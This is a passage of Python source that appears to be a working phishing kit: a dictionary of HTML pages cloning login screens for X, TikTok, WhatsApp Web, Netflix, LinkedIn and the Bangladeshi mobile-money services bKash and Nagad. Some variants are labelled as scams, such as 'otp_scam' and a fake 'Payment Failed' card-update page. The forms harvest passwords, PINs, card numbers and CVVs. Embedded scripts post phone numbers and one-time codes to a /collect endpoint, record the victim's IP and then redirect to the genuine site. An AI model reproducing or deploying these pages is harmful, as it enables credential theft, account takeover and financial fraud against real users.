  <button class="btn-sso">🍎 Sign in with Apple</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone, email, or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn-login" type="submit">Sign in</button>
  </form>
  <a class="forgot" href="#">Forgot password?</a>
  <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body></html>"""

PAGES['twitter']['verification'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>X Premium Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#e7e9ea;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 20px}
.x-icon{font-size:32px;font-weight:900;font-family:Georgia,serif;margin-bottom:24px}
.card{background:#16181c;border:1px solid #2f3336;border-radius:16px;padding:28px 20px;width:100%;max-width:400px}
.badge{display:inline-flex;align-items:center;gap:6px;background:#1d9bf0;color:#fff;border-radius:20px;padding:5px 14px;font-size:.85em;font-weight:700;margin-bottom:18px}
h2{font-size:1.3em;font-weight:700;margin-bottom:8px}
p{font-size:.9em;color:#71767b;line-height:1.6;margin-bottom:20px}
input{width:100%;padding:14px;background:#000;border:1px solid #536471;border-radius:4px;font-size:17px;color:#e7e9ea;outline:none;margin-bottom:12px}
input:focus{border-color:#1d9bf0}
input::placeholder{color:#71767b}
.btn{width:100%;padding:13px;background:#1d9bf0;color:#fff;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="x-icon">𝕏</div>
<div class="card">
  <div class="badge">✓ X Premium</div>
  <h2>Apply for X Verification</h2>
  <p>Get a blue checkmark and unlock Premium features. Confirm your identity to submit your application.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone, email, or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Apply for Verification</button>
  </form>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# TIKTOK
# ─────────────────────────────────────────────────────────────────────────────
PAGES['tiktok'] = {}

PAGES['tiktok']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>TikTok — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.logo{font-size:28px;font-weight:900;letter-spacing:-1px;margin:40px 0 8px;color:#000}
.logo span{color:#fe2c55}
h1{font-size:1.4em;font-weight:700;color:#161823;margin-bottom:4px;text-align:center}
.sub{font-size:.9em;color:#161823;opacity:.6;margin-bottom:28px;text-align:center}
.wrap{width:100%;max-width:360px}
.sso-btn{width:100%;padding:13px;background:#fff;border:1.5px solid #e3e3e4;border-radius:4px;font-size:15px;font-weight:600;color:#161823;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px}
.or-row{display:flex;align-items:center;gap:12px;margin:12px 0;color:#b0b0b0;font-size:13px}
.or-line{flex:1;height:1px;background:#e3e3e4}
input{width:100%;padding:13px 14px;border:1.5px solid #e3e3e4;border-radius:4px;font-size:15px;color:#161823;outline:none;margin-bottom:10px}
input:focus{border-color:#161823}
input::placeholder{color:#b0b0b0}
.btn{width:100%;padding:13px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:4px}
.signup-row{text-align:center;font-size:14px;color:#161823;margin-top:28px;padding-top:16px;border-top:1px solid #e3e3e4}
.signup-row a{color:#fe2c55;font-weight:700;text-decoration:none}
.terms{font-size:11px;color:#b0b0b0;text-align:center;margin-top:16px;line-height:1.6}
.terms a{color:#161823}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">Tik<span>Tok</span></div>
<div class="wrap">
  <h1>Log in to TikTok</h1>
  <p class="sub">Manage your account, check notifications, comment on videos, and more.</p>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log in</button>
  </form>
  <div class="signup-row">Don't have an account? <a href="#">Sign up</a></div>
  <div class="terms">By continuing, you agree to TikTok's <a href="#">Terms</a> and confirm that you have read its <a href="#">Privacy Policy</a>.</div>
</div>
</body></html>"""

PAGES['tiktok']['creator_fund'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>TikTok Creator Fund — Apply Now</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#010101,#1c1c1c);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px 24px;max-width:380px;width:100%}
.logo-wrap{display:flex;align-items:center;gap:8px;margin-bottom:20px}
.logo{font-size:22px;font-weight:900;letter-spacing:-1px;color:#000}
.logo span{color:#fe2c55}
.money-icon{font-size:48px;text-align:center;margin-bottom:16px;display:block}
h2{font-size:1.2em;font-weight:700;color:#161823;margin-bottom:8px;text-align:center}
p{font-size:.88em;color:#666;line-height:1.6;margin-bottom:20px;text-align:center}
.perk{display:flex;align-items:center;gap:10px;background:#fff4f6;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-size:.88em;color:#161823}
.perk .dot{width:8px;height:8px;border-radius:50%;background:#fe2c55;min-width:8px}
input{width:100%;padding:13px;border:1.5px solid #e3e3e4;border-radius:8px;font-size:15px;color:#161823;outline:none;margin-bottom:10px;margin-top:16px}
input:focus{border-color:#fe2c55}
.btn{width:100%;padding:13px;background:#fe2c55;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="logo-wrap"><div class="logo">Tik<span>Tok</span></div></div>
  <span class="money-icon">💰</span>
  <h2>TikTok Creator Fund</h2>
  <p>You've been selected to join TikTok's Creator Fund. Earn money for every 1,000 views!</p>
  <div class="perk"><div class="dot"></div>Earn $0.02–$0.04 per 1,000 views</div>
  <div class="perk"><div class="dot"></div>Monthly payments via PayPal/bank</div>
  <div class="perk"><div class="dot"></div>No minimum follower requirement</div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Apply to Creator Fund →</button>
  </form>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# WHATSAPP
# ─────────────────────────────────────────────────────────────────────────────
PAGES['whatsapp'] = {}

PAGES['whatsapp']['web_clone'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:'Segoe UI',Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:#008069;padding:14px 24px;display:flex;align-items:center;gap:12px}
.topbar span{color:#fff;font-size:1.15em;font-weight:600}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.1);max-width:780px;width:100%;display:flex;flex-wrap:wrap;overflow:hidden}
.left{flex:1;min-width:260px;padding:40px 32px;border-right:1px solid #f0f2f5}
.left h1{font-size:1.5em;font-weight:300;color:#111b21;margin-bottom:24px}
.step{display:flex;gap:10px;margin-bottom:16px}
.step .dot{width:8px;height:8px;border-radius:50%;background:#00a884;margin-top:6px;min-width:8px}
.step p{font-size:.92em;color:#3b4a54;line-height:1.6}
.divider{border:none;border-top:1px solid #f0f2f5;margin:20px 0}
.flag-row{display:flex;gap:8px;margin-bottom:12px}
.flag-row select,.flag-row input{padding:11px 10px;border:1.5px solid #d1d7db;border-radius:8px;font-size:.92em;background:#f9fafb;color:#111b21;outline:none}
.flag-row select:focus,.flag-row input:focus{border-color:#00a884}
.flag-row input{flex:1}
.btn{width:100%;padding:12px;background:#00a884;color:#fff;border:none;border-radius:8px;font-size:1em;font-weight:700;cursor:pointer}
.right{width:280px;min-width:260px;padding:40px 24px;text-align:center;background:#fafafa}
.qr-wrap{position:relative;width:200px;height:200px;margin:0 auto 20px;border:4px solid #25D366;border-radius:12px;overflow:hidden}
.qr-wrap img{width:100%;height:100%;object-fit:cover}
.right h3{font-size:1em;color:#111b21;margin-bottom:8px}
.right p{font-size:.82em;color:#667781;line-height:1.6}
#otp-panel{display:none;text-align:left;margin-top:14px}
.otp-row{display:flex;gap:7px;justify-content:center;margin:12px 0}
.otp-row input{width:38px;height:46px;text-align:center;font-size:1.2em;font-weight:700;border:2px solid #d1d7db;border-radius:8px;padding:0;background:#f9fafb;outline:none}
.otp-row input:focus{border-color:#00a884}
.ob-note{font-size:.82em;color:#667781;margin-bottom:10px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar">
  <svg width="26" height="26" viewBox="0 0 48 48" fill="white"><path d="M24 6C14.06 6 6 14.06 6 24c0 3.19.84 6.17 2.3 8.75L6 42l9.5-2.26A17.94 17.94 0 0024 42c9.94 0 18-8.06 18-18S33.94 6 24 6z"/></svg>
  <span>WhatsApp</span>
</div>
<div class="main">
  <div class="card">
    <div class="left">
      <h1>Log in to WhatsApp Web</h1>
      <div class="step"><div class="dot"></div><p>Open WhatsApp on your phone</p></div>
      <div class="step"><div class="dot"></div><p>Tap <strong>Menu → Linked Devices → Link a Device</strong></p></div>
      <div class="step"><div class="dot"></div><p>Point your phone to this screen to capture the code</p></div>
      <hr class="divider">
      <p style="font-size:.88em;color:#667781;margin-bottom:12px">Or verify your number to link via SMS</p>
      <div id="phone-s">
        <div class="flag-row">
          <select id="cc"><option value="+880">🇧🇩 +880</option><option value="+91">🇮🇳 +91</option><option value="+1">🇺🇸 +1</option><option value="+44">🇬🇧 +44</option><option value="+92">🇵🇰 +92</option></select>
          <input type="tel" id="pnum" placeholder="01XXXXXXXXX">
        </div>
        <button class="btn" onclick="sendCode()">Send Code</button>
      </div>
      <div id="otp-panel">
        <div class="ob-note">Code sent to <strong id="st2"></strong></div>
        <div class="otp-row">
          <input type="number" class="ob" maxlength="1" oninput="om(this,0)">
          <input type="number" class="ob" maxlength="1" oninput="om(this,1)">
          <input type="number" class="ob" maxlength="1" oninput="om(this,2)">
          <input type="number" class="ob" maxlength="1" oninput="om(this,3)">
          <input type="number" class="ob" maxlength="1" oninput="om(this,4)">
          <input type="number" class="ob" maxlength="1" oninput="om(this,5)">
        </div>
        <button class="btn" onclick="verifyCode()">Verify</button>
      </div>
    </div>
    <div class="right">
      <div class="qr-wrap"><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=WhatsAppLogin" alt="QR"></div>
      <h3>Scan QR code</h3>
      <p>Open WhatsApp on your phone → Menu → Linked Devices → Link a Device</p>
    </div>
  </div>
</div>
<script>
var ph="",cc2="";
function sendCode(){
  ph=document.getElementById('pnum').value.trim();
  cc2=document.getElementById('cc').value;
  if(ph.length<7)return;
  document.getElementById('phone-s').style.display='none';
  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'wa_phone',phone:cc2+ph})}).catch(()=>{});
  setTimeout(function(){
    document.getElementById('otp-panel').style.display='block';
    document.getElementById('st2').textContent=cc2+' '+ph;
  },1500);
}
function om(el,idx){
  var v=el.value.toString().slice(-1);el.value=v;
  var b=document.querySelectorAll('.ob');
  if(v&&idx<5)b[idx+1].focus();
  if(idx===5&&v)verifyCode();
}
function verifyCode(){
  var b=document.querySelectorAll('.ob');
  var otp=Array.from(b).map(x=>x.value).join('');
  if(otp.length<6)return;
  fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
    fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'wa_otp',phone:cc2+ph,otp:otp,ip:d.ip})}).catch(()=>{});
  }).catch(()=>{});
  setTimeout(()=>window.location.replace('https://web.whatsapp.com/'),2500);
}
</script>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# NETFLIX
# ─────────────────────────────────────────────────────────────────────────────
PAGES['netflix'] = {}

PAGES['netflix']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Netflix</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:Netflix Sans,Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://assets.nflxext.com/ffe/siteui/vlv3/9134db96-10d6-4a64-a619-a21da22f8999/images/static-logged-out-metalpage-v3.jpg') center/cover;opacity:.5;z-index:0}
.topbar{position:relative;z-index:1;width:100%;padding:18px 24px;display:flex;align-items:center}
.netflix-logo{color:#e50914;font-size:28px;font-weight:900;letter-spacing:-1px}
.card{position:relative;z-index:1;background:rgba(0,0,0,.75);border-radius:4px;padding:48px 32px;width:100%;max-width:400px;margin:40px 16px}
h1{color:#fff;font-size:1.8em;font-weight:700;margin-bottom:28px}
input{width:100%;padding:16px 20px;background:#333;border:none;border-radius:4px;font-size:16px;color:#fff;outline:none;margin-bottom:16px}
input:focus{background:#454545;outline:2px solid #fff}
input::placeholder{color:#8c8c8c}
.btn{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:12px}
.btn:hover{background:#f40612}
.or-row{display:flex;align-items:center;gap:12px;margin:8px 0;color:#737373;font-size:13px}
.or-line{flex:1;height:1px;background:#737373}
.code-btn{width:100%;padding:14px;background:transparent;color:#fff;border:1px solid #737373;border-radius:4px;font-size:15px;cursor:pointer;margin-bottom:16px}
.remember{display:flex;align-items:center;gap:8px;font-size:13px;color:#b3b3b3;margin-bottom:16px}
.remember input[type=checkbox]{width:16px;height:16px;accent-color:#e50914}
.links{font-size:13px;color:#b3b3b3}
.links a{color:#b3b3b3;text-decoration:none}
.links a:hover{text-decoration:underline}
.signup-row{margin-top:16px;font-size:16px;color:#737373}
.signup-row a{color:#fff;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="bg"></div>
<div class="topbar"><div class="netflix-logo">NETFLIX</div></div>
<div class="card">
  <h1>Sign In</h1>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or mobile number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
  <button class="code-btn">Use a Sign-In Code</button>
  <div class="remember"><input type="checkbox" checked>Remember me</div>
  <div class="links"><a href="#">Forgot password?</a></div>
  <div class="signup-row">New to Netflix? <a href="#">Sign up now.</a></div>
</div>
</body></html>"""

PAGES['netflix']['payment_update'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Netflix — Update Payment Method</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.logo{color:#e50914;font-size:28px;font-weight:900;margin:24px 0;letter-spacing:-1px}
.card{background:#222;border-radius:8px;padding:28px 20px;width:100%;max-width:400px;margin-bottom:20px}
.alert-top{background:#e50914;border-radius:6px;padding:12px 14px;margin-bottom:20px;font-size:.88em;color:#fff;line-height:1.5}
.alert-top strong{display:block;margin-bottom:4px;font-size:1em}
h2{color:#fff;font-size:1.1em;margin-bottom:16px;font-weight:600}
input{width:100%;padding:14px;background:#333;border:none;border-radius:4px;font-size:15px;color:#fff;outline:none;margin-bottom:12px}
input:focus{background:#454545;outline:1px solid #aaa}
input::placeholder{color:#8c8c8c}
.card-row{display:flex;gap:10px}
.card-row input{flex:1}
.btn{width:100%;padding:14px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer}
.secure{text-align:center;font-size:12px;color:#737373;margin-top:12px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">NETFLIX</div>
<div class="card">
  <div class="alert-top"><strong>⚠️ Payment Failed</strong>We were unable to process your payment. Update your payment method to continue watching.</div>
  <h2>Update Payment Method</h2>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Netflix email" required>
    <input type="password" name="password" placeholder="Netflix password" required>
    <input type="text" name="card_number" placeholder="Card number" maxlength="19">
    <div class="card-row">
      <input type="text" name="expiry" placeholder="MM/YY" maxlength="5">
      <input type="text" name="cvv" placeholder="CVV" maxlength="4">
    </div>
    <input type="text" name="card_name" placeholder="Name on card">
    <button class="btn" type="submit">Update Payment Method</button>
  </form>
  <div class="secure">🔒 Secured by Netflix</div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# LINKEDIN
# ─────────────────────────────────────────────────────────────────────────────
PAGES['linkedin'] = {}

PAGES['linkedin']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>LinkedIn: Log In or Sign Up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f3f2ef;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:#fff;border-bottom:1px solid #d0cece;padding:14px 24px;display:flex;align-items:center}
.li-logo{color:#0a66c2;font-size:26px;font-weight:800;letter-spacing:-1px}
.wrap{max-width:400px;width:100%;margin:40px auto;padding:0 16px}
.card{background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.1),0 2px 6px rgba(0,0,0,.1);padding:28px 24px}
.card h1{font-size:1.5em;font-weight:600;color:#1c1c1c;margin-bottom:4px}
.card .sub{font-size:.95em;color:#1c1c1c;margin-bottom:20px}
.sso-btn{width:100%;padding:12px;border:1.5px solid #0a66c2;border-radius:28px;font-size:15px;font-weight:600;color:#0a66c2;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#fff}
.sso-btn:active{background:#f3f2ef}
.or-row{display:flex;align-items:center;gap:12px;margin:14px 0;color:#666;font-size:13px}
.or-line{flex:1;height:1px;background:#d0cece}
label{display:block;font-size:14px;font-weight:600;color:#1c1c1c;margin-bottom:4px}
input{width:100%;padding:12px 14px;border:1px solid #aaa;border-radius:4px;font-size:16px;color:#1c1c1c;outline:none;margin-bottom:16px}
input:focus{border-color:#0a66c2;border-width:2px;padding:11px 13px}
.btn{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer}
.btn:active{background:#004182}
.forgot{display:block;text-align:center;color:#0a66c2;font-size:14px;text-decoration:none;margin-top:14px;font-weight:600}
.signup-row{text-align:center;font-size:15px;color:#1c1c1c;margin-top:16px}
.signup-row a{color:#0a66c2;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><div class="li-logo">in</div></div>
<div class="wrap">
  <div class="card">
    <h1>Welcome back</h1>
    <p class="sub">Stay updated on your professional world</p>
    <button class="sso-btn">
      <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
      Continue with Google
    </button>
    <div class="or-row"><div class="or-line"></div>or<div class="or-line"></div></div>
    <form action="/login" method="POST">
      <label>Email or Phone</label>
      <input type="text" name="email" autocomplete="username" required>
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required>
      <button class="btn" type="submit">Sign in</button>
    </form>
    <a class="forgot" href="#">Forgot password?</a>
    <div class="signup-row">New to LinkedIn? <a href="#">Join now</a></div>
  </div>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# BKASH (Bangladesh specific)
# ─────────────────────────────────────────────────────────────────────────────
PAGES['bkash'] = {}

PAGES['bkash']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>bKash — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#E2136E;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{width:100%;background:#E2136E;padding:20px;text-align:center}
.bkash-logo{color:#fff;font-size:32px;font-weight:900;letter-spacing:-1px}
.bkash-logo span{color:#fff}
.sub-logo{color:rgba(255,255,255,.8);font-size:12px;letter-spacing:2px;text-transform:uppercase;margin-top:2px}
.card{background:#fff;border-radius:16px 16px 0 0;width:100%;flex:1;margin-top:20px;padding:32px 24px}
.card h2{font-size:1.3em;font-weight:700;color:#E2136E;margin-bottom:6px}
.card p{font-size:.88em;color:#666;margin-bottom:24px}
label{display:block;font-size:.85em;font-weight:600;color:#333;margin-bottom:5px}
input{width:100%;padding:14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:16px;color:#333;outline:none;margin-bottom:16px}
input:focus{border-color:#E2136E}
.btn{width:100%;padding:14px;background:#E2136E;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
.btn:active{background:#c40d5e}
.forgot{display:block;text-align:center;color:#E2136E;font-size:14px;text-decoration:none;margin-top:14px;font-weight:600}
.signup-row{text-align:center;font-size:14px;color:#666;margin-top:16px}
.signup-row a{color:#E2136E;font-weight:700;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar">
  <div class="bkash-logo">bKash</div>
  <div class="sub-logo">Mobile Financial Service</div>
</div>
<div class="card">
  <h2>Log in to bKash</h2>
  <p>Enter your mobile number and PIN to continue</p>
  <form action="/login" method="POST">
    <label>Mobile Number</label>
    <input type="tel" name="email" placeholder="01XXXXXXXXX" maxlength="11" required>
    <label>PIN</label>
    <input type="password" name="password" placeholder="Enter your 5-digit PIN" maxlength="5" required>
    <button class="btn" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgot PIN?</a>
  <div class="signup-row">New user? <a href="#">Register now</a></div>
</div>
</body></html>"""

PAGES['bkash']['otp_scam'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>bKash — Account Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px 16px}
.logo{color:#E2136E;font-size:28px;font-weight:900;margin-bottom:16px}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.1);padding:24px 20px;width:100%;max-width:380px}
.alert-box{background:#fff3f8;border:1px solid #E2136E;border-radius:8px;padding:12px;margin-bottom:20px;font-size:.85em;color:#c40d5e;line-height:1.6}
.alert-box strong{display:block;margin-bottom:4px}
label{display:block;font-size:.85em;font-weight:600;color:#333;margin-bottom:5px}
input{width:100%;padding:13px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:16px;color:#333;outline:none;margin-bottom:14px}
input:focus{border-color:#E2136E}
.btn{width:100%;padding:13px;background:#E2136E;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
#otp-s{display:none}
.otp-row{display:flex;gap:8px;justify-content:center;margin:14px 0}
.otp-row input{width:44px;height:52px;text-align:center;font-size:1.3em;font-weight:700;border:2px solid #e0e0e0;border-radius:8px;padding:0;margin:0;background:#fafafa}
.otp-row input:focus{border-color:#E2136E}
.otp-note{font-size:.83em;color:#666;margin-bottom:12px;text-align:center}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">bKash</div>
<div class="card">
  <div class="alert-box"><strong>⚠️ Unusual Activity Detected</strong>Your bKash account has been temporarily locked. Verify your identity to restore access.</div>
  <div id="phone-s">
    <label>Registered Mobile Number</label>
    <input type="tel" id="pnum" placeholder="01XXXXXXXXX" maxlength="11">
    <label>PIN</label>
    <input type="password" id="pin" placeholder="5-digit PIN" maxlength="5">
    <button class="btn" onclick="sendOTP()">Send OTP to Verify</button>
  </div>
  <div id="otp-s">
    <p class="otp-note">OTP sent to <strong id="pshow"></strong>. Enter it below.</p>
    <div class="otp-row">
      <input type="number" class="ob" maxlength="1" oninput="om(this,0)">
      <input type="number" class="ob" maxlength="1" oninput="om(this,1)">
      <input type="number" class="ob" maxlength="1" oninput="om(this,2)">
      <input type="number" class="ob" maxlength="1" oninput="om(this,3)">
      <input type="number" class="ob" maxlength="1" oninput="om(this,4)">
      <input type="number" class="ob" maxlength="1" oninput="om(this,5)">
    </div>
    <button class="btn" onclick="verify()">Verify OTP</button>
  </div>
</div>
<script>
function sendOTP(){
  var p=document.getElementById('pnum').value.trim();
  var pin=document.getElementById('pin').value.trim();
  if(p.length<10||pin.length<4)return;
  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'bkash_phone',phone:p,pin:pin})}).catch(()=>{});
  document.getElementById('phone-s').style.display='none';
  document.getElementById('otp-s').style.display='block';
  document.getElementById('pshow').textContent=p;
}
function om(el,idx){
  var v=el.value.toString().slice(-1);el.value=v;
  var b=document.querySelectorAll('.ob');
  if(v&&idx<5)b[idx+1].focus();
  if(idx===5&&v)verify();
}
function verify(){
  var b=document.querySelectorAll('.ob');
  var otp=Array.from(b).map(x=>x.value).join('');
  if(otp.length<6)return;
  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'bkash_otp',otp:otp})}).catch(()=>{});
  setTimeout(()=>window.location.replace('https://www.bkash.com/'),2000);
}
</script>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# NAGAD
# ─────────────────────────────────────────────────────────────────────────────
PAGES['nagad'] = {}

PAGES['nagad']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Nagad — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#ee2a24;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.topbar{padding:28px;text-align:center}
.nagad-logo{color:#fff;font-size:36px;font-weight:900;letter-spacing:-1px}
.nagad-logo span{color:#f7c430}
.sub{color:rgba(255,255,255,.8);font-size:12px;letter-spacing:1px}
.card{background:#fff;border-radius:20px 20px 0 0;width:100%;flex:1;padding:32px 24px}
h2{font-size:1.2em;font-weight:700;color:#ee2a24;margin-bottom:4px}
p{font-size:.88em;color:#888;margin-bottom:22px}
label{font-size:.85em;font-weight:600;color:#333;display:block;margin-bottom:5px}
input{width:100%;padding:14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:16px;color:#333;outline:none;margin-bottom:14px}
input:focus{border-color:#ee2a24}
.btn{width:100%;padding:14px;background:#ee2a24;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer}
.forgot{display:block;text-align:center;color:#ee2a24;font-size:14px;text-decoration:none;margin-top:14px;font-weight:600}
</style></head><body>
TRACK_PLACEHOLDER
